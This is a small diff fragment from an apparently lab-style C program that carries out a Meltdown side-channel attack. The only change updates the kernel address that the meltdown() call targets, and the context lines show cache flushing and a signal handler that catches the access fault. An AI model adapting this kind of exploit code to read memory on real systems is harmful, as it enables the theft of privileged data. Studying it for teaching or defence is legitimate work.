@@ -89,7 +89,7 @@ int main()
   flushSideChannel();
     
   if (sigsetjmp(jbuf, 1) == 0) {
-      meltdown(0xfaf57000);                
+      meltdown(0xfdd7c000);                
   }
   else {
       printf("Memory access violation!\n");
